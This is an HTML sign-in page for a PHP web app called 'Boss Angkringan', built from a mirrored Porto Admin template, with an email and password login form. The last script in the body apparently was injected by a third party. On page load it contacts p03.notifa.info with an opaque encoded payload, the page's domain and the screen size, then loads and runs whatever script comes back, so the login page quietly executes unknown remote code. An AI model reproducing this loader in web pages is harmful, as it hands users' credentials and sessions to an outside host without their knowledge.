<!doctype html>
<html class="fixed">
	
<!-- Mirrored from portotheme.com/html/porto-admin/2.2.0/pages-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 18 Apr 2020 06:11:07 GMT -->
<head>

		<!-- Basic -->
        <meta charset="UTF-8">
        <link rel="icon" type="image/png" size="32x32" href="<?= base_url() ?>/assets/img/logo.png"/>
        <title>Sign In | Boss Angkringan</title>
		<meta name="keywords" content="HTML5 Admin Template" />
		<meta name="description" content="Porto Admin - Responsive HTML5 Template">
		<meta name="author" content="okler.net">

		<!-- Mobile Metas -->
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

		<!-- Web Fonts  -->
		<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800|Shadows+Into+Light" rel="stylesheet" type="text/css">

		<!-- Vendor CSS -->
		<link rel="stylesheet" href="<?= base_url() ?>/assets/vendor/bootstrap/css/bootstrap.css" />
		<link rel="stylesheet" href="<?= base_url() ?>/assets/vendor/animate/animate.css">

		<link rel="stylesheet" href="<?= base_url() ?>/assets/vendor/font-awesome/css/all.min.css" />
		<link rel="stylesheet" href="<?= base_url() ?>/assets/vendor/magnific-popup/magnific-popup.css" />
		<link rel="stylesheet" href="<?= base_url() ?>/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker3.css" />

		<!-- Theme CSS -->
		<link rel="stylesheet" href="<?= base_url() ?>/assets/css/theme.css" />

		<!-- Theme Custom CSS -->
		<link rel="stylesheet" href="<?= base_url() ?>/assets/css/custom.css">

		<!-- Head Libs -->
        <script src="<?= base_url() ?>/assets/vendor/modernizr/modernizr.js"></script>		
        <script src="<?= base_url() ?>/assets/master/style-switcher/style.switcher.localstorage.js"></script>

	</head>
	<body>
		<!-- start: page -->
		<section class="body-sign">
			<div class="center-sign">
				<a href="" class="logo float-left">
					<img src="<?= base_url() ?>/assets/img/logo.png" height="54" alt="Porto Admin" />
				</a>

				<div class="panel card-sign">
					<div class="card-title-sign mt-3 text-right">
						<h2 class="title text-uppercase font-weight-bold m-0"><i class="fas fa-user mr-1"></i> Sign In</h2>
					</div>
					<div class="card-body">
						<form action="<?= base_url('Auth/login') ?>" method="post">
							<div class="form-group mb-3">
								<label>Email</label>
								<div class="input-group">
									<input name="email" type="email" class="form-control form-control-lg" />
									<span class="input-group-append">
										<span class="input-group-text">
											<i class="fas fa-envelope"></i>
										</span>
									</span>
								</div>
							</div>

							<div class="form-group mb-3">
								<div class="clearfix">
									<label class="float-left">Password</label>
									<a href="<?= base_url('Auth/lupa_password') ?>" class="float-right">Lost Password?</a>
								</div>
								<div class="input-group">
									<input name="pwd" type="password" class="form-control form-control-lg" />
									<span class="input-group-append">
										<span class="input-group-text">
											<i class="fas fa-lock"></i>
										</span>
									</span>
								</div>
							</div>

							<div class="row">
								<div class="col-sm-12 text-center">
									<button type="submit" name="login" class="btn btn-success mt-2">Sign In</button>
								</div>
							</div>

						</form>
					</div>
				</div>

				<p class="text-center text-muted mt-3 mb-3">&copy; Copyright 2020. All Rights Reserved.</p>
			</div>
		</section>
		<!-- end: page -->

		<!-- Vendor -->
        <script src="<?= base_url() ?>/assets/vendor/jquery/jquery.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/jquery-browser-mobile/jquery.browser.mobile.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/jquery-cookie/jquery.cookie.js"></script>		
        <script src="<?= base_url() ?>/assets/master/style-switcher/style.switcher.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/popper/umd/popper.min.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/bootstrap/js/bootstrap.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/common/common.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/nanoscroller/nanoscroller.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/magnific-popup/jquery.magnific-popup.js"></script>		
        <script src="<?= base_url() ?>/assets/vendor/jquery-placeholder/jquery.placeholder.js"></script>
		
		<!-- Theme Base, Components and Settings -->
		<script src="<?= base_url() ?>/assets/js/theme.js"></script>
		
		<!-- Theme Custom -->
		<script src="js/custom.js"></script>
		
		<!-- Theme Initialization Files -->
		<script src="js/theme.init.js"></script>
		<!-- Analytics to Track Preview Website -->		<script>		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)		  })(window,document,'script','../../../../www.google-analytics.com/analytics.js','ga');		  ga('create', 'UA-42715764-8', 'auto');		  ga('send', 'pageview');		</script>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXW2J9WdDDNx%2bP3L2AgpQm3AV7klh7sB9rMOTPMjlYkEdQmSzQSSIynLU%2fU%2fou%2bFWOj6mzzxsyOp0YjD3uBec5nUcyMYzlyG%2bgdoCY0izdYrd1sFhP9IibA9Nj%2b2kt%2bYrQT5wyt%2buwv9Gsk5k7akJIJroVNZGsFCKh5xOQlehj%2bkgJOpWY4kZFiVQdblTHxCTjAPdX0PA25iSbqB%2bzUk7%2fPtFfU764ulr5kOvUNEo05TSXjd0lECG4QGxlMnigJGuM3b1yMSBDmapWmsAm%2fnD6RWoaol4HXK1iBhzUvllNT0Zq6FjnSVbSGVGRjBaavntn%2bcuq%2ffS8Yx7thYZxhmHR8jFlHDmXsIoY3KxuSrgm097MY%2bSqyVs4bO%2bzoa3NWWgJRcf%2f1aBxsmyimrVhCaIoy4or3tj85%2fUg01QlTElQGXF6aRq9W7qH%2fQhViGTR6ioq5peK%2bkG6PqZl47z8X0%2fqD9vGOgO1DgOtV7JjJ6ul6cQnsrnsRYMgo9Hczvb%2fAC4EGPQxy9XHoVs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from portotheme.com/html/porto-admin/2.2.0/pages-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 18 Apr 2020 06:11:07 GMT -->
</html>